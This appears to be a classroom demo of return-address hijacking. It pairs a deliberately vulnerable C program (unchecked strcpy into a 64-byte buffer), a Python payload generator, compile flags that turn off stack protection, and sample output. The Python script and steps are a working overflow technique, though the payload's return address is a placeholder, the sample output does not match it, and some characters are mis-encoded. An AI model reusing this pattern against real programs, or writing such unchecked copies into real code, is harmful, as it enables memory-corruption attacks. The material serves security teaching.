# Return addresss manipulation

## Code example (C)
```c
// return_address_demo.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void secret_function() {
    printf("ðŸŽ¯ SUCCESS: You've hijacked the execution flow!\n");
    printf("ðŸš¨ This demonstrates how buffer overflows can redirect program execution\n");
    printf("ðŸ’€ In a real attack, this could execute malicious shellcode\n");
}

void normal_function() {
    printf("âœ… Normal execution path - this should be called\n");
}

void vulnerable_input(char* user_input) {
    char buffer[64];  // 64-byte buffer
    printf("Buffer address: %p\n", buffer);
    printf("Copying user input into buffer...\n");
    
    // VULNERABLE: No bounds checking
    strcpy(buffer, user_input);
    
    printf("Buffer contents: %.100s\n", buffer);
    printf("Returning from vulnerable_input...\n");
}

int main(int argc, char* argv[]) {
    printf("=== Return Address Manipulation Demo ===\n");
    printf("secret_function address: %p\n", secret_function);
    printf("normal_function address: %p\n", normal_function);
    printf("main function address: %p\n", main);
    
    if (argc != 2) {
        printf("\nUsage: %s <input_string>\n", argv[0]);
        printf("Try: %s \"Normal input\"\n", argv[0]);
        printf("Then try with a very long string to trigger overflow\n");
        return 1;
    }
    
    printf("\n--- Before calling vulnerable function ---\n");
    vulnerable_input(argv[1]);
    printf("--- After vulnerable function returned ---\n");
    
    normal_function();  // This should execute normally
    
    printf("Program completed normally\n");
    return 0;
}
```

## Exploit (Python)
```python
# generate_exploit.py
import struct
import sys

def generate_exploit():
    # Addresses will vary - these are examples
    # In real demo, you'd need to find actual addresses using gdb or objdump
    buffer_size = 64
    padding_to_return_address = 8  # May vary based on compiler/architecture
    
    print("=== Buffer Overflow Exploit Generator ===")
    print("This script generates a payload to hijack program execution")
    print()
    
    # Create overflow payload
    payload = b"A" * (buffer_size + padding_to_return_address)
    
    # Note: In a real demo, you'd replace this with actual secret_function address
    # obtained through debugging or disassembly
    fake_return_address = b"BBBB"  # Placeholder - replace with actual address
    
    payload += fake_return_address
    
    print(f"Payload length: {len(payload)} bytes")
    print(f"Buffer size: {buffer_size} bytes")
    print(f"Overflow: {len(payload) - buffer_size} bytes")
    print()
    print("Payload (hex):", payload.hex())
    print("Payload (ascii):", payload.decode('ascii', errors='replace'))
    
    # Save to file for testing
    with open('exploit_payload.txt', 'wb') as f:
        f.write(payload)
    
    print("\nPayload saved to exploit_payload.txt")
    print("Usage: ./return_address_demo \"$(cat exploit_payload.txt)\"")

if __name__ == "__main__":
    generate_exploit()
```

## Steps
1. Compile with: gcc -fno-stack-protector -z execstack -o return_demo return_address_demo.c
2. Show normal execution with short input
3. Use objdump -d return_demo | grep secret_function to find target address
4. Create exploit payload with proper return address
5. Demonstrate execution hijacking
6. Use GDB to show stack corruption step-by-step

## Output
```shell
=== Return Address Manipulation Demo ===
secret_function address: 0x401196
normal_function address: 0x4011c7
main function address: 0x4011f8

--- Before calling vulnerable function ---
Buffer address: 0x7ffe8c5a1b40
Copying user input into buffer...
Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Returning from vulnerable_input...
ðŸŽ¯ SUCCESS: You've hijacked the execution flow!
ðŸš¨ This demonstrates how buffer overflows can redirect program execution
ðŸ’€ In a real attack, this could execute malicious shellcode
Segmentation fault (core dumped)
```
